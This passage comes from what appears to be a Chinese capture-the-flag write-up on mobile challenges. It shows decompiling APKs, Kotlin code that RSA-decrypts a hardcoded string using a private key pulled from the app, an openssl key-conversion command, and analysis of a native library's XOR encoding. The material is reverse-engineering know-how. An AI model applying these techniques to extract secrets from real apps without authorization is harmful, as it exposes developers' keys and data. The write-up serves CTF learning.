<p class="my-4 leading-7"><img alt="遗漏的逻辑" src="data:image/png;base64,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"/></p>
<p class="my-4 leading-7">看这里，getline是读入一个字符串，45是指定的分隔符，换算成ascii就是减号-。所以猜测4段md5中间还有三个减号，正好组成19位。提交，正确！</p>
<h3 id="mobile-7-pdd" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#mobile-7-pdd">#</a>mobile-7 pdd</h3>
<p class="my-4 leading-7">apk扔到反编译工具里看一下，发现在ValActivity.class里有一个解密程序，通过intent接收一个privatekey，然后对硬编码的字符串进行解密。解密逻辑都在Util.class里，而且privatekey放在了res/raw目录下。</p>
<p class="my-4 leading-7">根据解密逻辑写一段解密代码：</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2023.android_7
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">import org.apache.commons.codec.binary.Base64
</span><span style="display:block;padding:0 1.25rem">import java.nio.charset.StandardCharsets
</span><span style="display:block;padding:0 1.25rem">import java.security.KeyFactory
</span><span style="display:block;padding:0 1.25rem">import java.security.PrivateKey
</span><span style="display:block;padding:0 1.25rem">import java.security.spec.PKCS8EncodedKeySpec
</span><span style="display:block;padding:0 1.25rem">import javax.crypto.Cipher
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun getPrivateKeyFromString(str: String): PrivateKey {
</span><span style="display:block;padding:0 1.25rem">    val var1 = PKCS8EncodedKeySpec(Base64.decodeBase64(str))
</span><span style="display:block;padding:0 1.25rem">    return KeyFactory.getInstance(&quot;RSA&quot;).generatePrivate(var1)
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun decrypt(s: String, key: PrivateKey): String {
</span><span style="display:block;padding:0 1.25rem">    val instance = Cipher.getInstance(&quot;RSA/ECB/PKCS1Padding&quot;)
</span><span style="display:block;padding:0 1.25rem">    instance.init(2, key)
</span><span style="display:block;padding:0 1.25rem">    return String(instance.doFinal(Base64.decodeBase64(s)), StandardCharsets.UTF_8)
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">val privateKeyStr =
</span><span style="display:block;padding:0 1.25rem">    &quot;MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAhwgY3ay6Ty0W6nUt\n&quot; +
</span><span style="display:block;padding:0 1.25rem">            &quot;yqhiUV4+5/KFwiY3U1YkkAdXwMuB9T367zDkjVEF5bnB2swDt5/O0P08xArhzQ0p\n&quot; +
</span><span style="display:block;padding:0 1.25rem">            &quot;WDoK/QIDAQABAkARKGq8dC/CUsjoJtaYOzgu/apBn9P2PRPnn3kK4hv479G40An/\n&quot; +
</span><span style="display:block;padding:0 1.25rem">            &quot;emfHM4mN1cQT+PD9Eswg+JjohdIxPlH/kQLxAiEAip0SFC1CrqzW35UhlFxdbxNT\n&quot; +
</span><span style="display:block;padding:0 1.25rem">            &quot;DSN10TgPj8tVn84CIrUCIQD5Ynos1RHwiT0HFdpZ/CIojd13TkzYiYPt1V81nnoM\n&quot; +
</span><span style="display:block;padding:0 1.25rem">            &quot;KQIgIspTnE7T2sW01L84g2U/aj6ebMDGtHFurnepkQeCz7UCIQDWO1WvK77EfnCx\n&quot; +
</span><span style="display:block;padding:0 1.25rem">            &quot;pIE16hXB9tS4h8gWAFQYPMMUgbZguQIgN3eGtyJasra6VIg/huHLBRjU3shYh9TN\n&quot; +
</span><span style="display:block;padding:0 1.25rem">            &quot;WOfeyRzQeyw=&quot;
</span><span style="display:block;padding:0 1.25rem">val text = &quot;X2l9IVSbjYDgVQ2dLoIZWo55cGUT4Mgx2tJuDjZwi5E+e8kZ28iNINOJdXv9NtVXBiY+ow9kpRtEFbuE3oJr6g==&quot;
</span><span style="display:block;padding:0 1.25rem">fun main() {
</span><span style="display:block;padding:0 1.25rem">    println(decrypt(text, getPrivateKeyFromString(privateKeyStr)))
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">密钥与apk里的privatekey.pdd不一样，直接使用会报<code>algid parse error, not a sequence</code>的错误。需要转一下格式</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>key.txt
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">-----BEGIN RSA PRIVATE KEY-----
</span><span style="display:block;padding:0 1.25rem">MIIBOgIBAAJBAIcIGN2suk8tFup1LcqoYlFePufyhcImN1NWJJAHV8DLgfU9+u8w5I1RBeW5wdrMA7efztD9PMQK4c0NKVg6Cv0CAwEAAQJAEShqvHQvwlLI6CbWmDs4Lv2qQZ/T9j0T5595CuIb+O/RuNAJ/3pnxzOJjdXEE/jw/RLMIPiY6IXSMT5R/5EC8QIhAIqdEhQtQq6s1t+VIZRcXW8TUw0jddE4D4/LVZ/OAiK1AiEA+WJ6LNUR8Ik9BxXaWfwiKI3dd05M2ImD7dVfNZ56DCkCICLKU5xO09rFtNS/OINlP2o+nmzAxrRxbq53qZEHgs+1AiEA1jtVryu+xH5wsaSBNeoVwfbUuIfIFgBUGDzDFIG2YLkCIDd3hrciWrK2ulSIP4bhywUY1N7IWIfUzVjn3skc0Hss
</span><span style="display:block;padding:0 1.25rem">-----END RSA PRIVATE KEY-----
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">openssl pkcs8 -topk8 -inform pem -in key.txt -outform pem -nocrypt -out privatekey_p8.key</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">这样解密出来的之后后半段密钥，前半段在哪儿？</p>
<p class="my-4 leading-7"><img alt="十六进制查看" src="/static/image/mobile-7-1.ce1e7c21.png"/></p>
<p class="my-4 leading-7">就在apk里，不知道被藏哪里了。。。有没有大佬帮忙指认一下。。。</p>
<h3 id="mobile-9-bqq" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#mobile-9-bqq">#</a>mobile-9 bqq</h3>
<p class="my-4 leading-7">照例反编译apk文件。发现java代码调用了so文件的flag和dddd函数，其它的逻辑没了。重点看一下so文件里的逻辑。</p>
<p class="my-4 leading-7"><img alt="反编译so" src="/static/image/mobile-9-1.2cc3a7ec.png"/></p>
<p class="my-4 leading-7">flag函数是一个编码算法，先将输入字符串与<code>dlddddhm</code>进行异或，然后将异或的结果转成hex字符串。</p>
<p class="my-4 leading-7">dddd函数是一些请求远程服务的函数，大体就是通过socket与远程服务连接，然后拼接HTTP header发送。</p>
<p class="my-4 leading-7">将这两部分逻辑提取出来，写了一个程序。然后再看一下远程服务，是一个网页，提示give me the trueflag.</p>
